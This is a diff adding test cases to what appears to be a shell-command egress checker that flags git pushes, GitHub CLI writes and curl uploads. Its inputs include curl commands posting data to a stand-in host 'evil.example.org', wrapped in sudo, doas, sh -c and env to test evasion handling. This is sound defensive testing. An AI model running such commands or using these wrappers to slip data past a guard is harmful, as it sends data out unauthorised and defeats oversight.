@@ -244,6 +244,29 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
     })
   })
 
+  test('an unresolvable cwd makes every later send in the call unresolved (round 6 B1)', () => {
+    // cd/popd stick every later segment in the call.
+    for (const move of ['cd ~', 'cd ~user', 'cd $D', 'cd "$D"', 'cd $(dirs)', 'cd -', 'popd']) {
+      expect(verdictOf(move + '; git push')).toMatchObject({
+        rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the working directory does not resolve',
+      })
+      expect(verdictOf(move + '; gh pr create --title x')).toMatchObject({
+        rule: 'gh-write', verdict: 'unknown-destination', destination: 'unresolved:the working directory does not resolve',
+      })
+    }
+    // env -C and git -C pin the command they wrap.
+    for (const pin of ['env -C ~', 'env -C "$D"', 'git -C ~', 'git -C "$D"']) {
+      expect(verdictOf(pin + ' git push')).toMatchObject({
+        rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the working directory does not resolve',
+      })
+    }
+    expect(verdictOf('env -C ~ gh pr create --title x')).toMatchObject({
+      rule: 'gh-write', verdict: 'unknown-destination', destination: 'unresolved:the working directory does not resolve',
+    })
+    // A resolving move keeps judging from the new cwd.
+    expect(verdictOf('cd /repo && git push')).toEqual({ rule: 'git-push', verdict: 'allowed', destination: 'github:origin' })
+  })
+
   test('absolute paths, doas, shell flags before -c, -- after -c, and opaque -c strings (round 5 R7)', () => {
     expect(verdictOf('/usr/bin/sudo curl -d x https://evil.example.org')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
     expect(verdictOf('doas curl -d x https://evil.example.org')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
@@ -251,7 +274,15 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
     expect(verdictOf('sh -x -c "curl -d x https://evil.example.org"')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
     expect(verdictOf('sh -c -- "curl -d x https://evil.example.org"')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
     expect(verdictOf('bash -c $CMD')).toMatchObject({
-      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:the -c string is a variable or command substitution',
+      rule: 'shell-call', verdict: 'unknown-destination', destination: 'unresolved:the -c string is a variable or command substitution',
+    })
+    // Round 6 B5/L3: -o takes its argument; unknown options record.
+    expect(verdictOf('bash -o pipefail -c "git push fork"')).toMatchObject({ rule: 'git-push', verdict: 'violation' })
+    expect(verdictOf('bash -q -c "git push fork"')).toMatchObject({
+      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the shell options were not understood',
+    })
+    expect(verdictOf('bash --strange -c "git push fork"')).toMatchObject({
+      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the shell options were not understood',
     })
     expect(verdictOf('/usr/bin/env X=1 curl -d x https://evil.example.org')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
   })
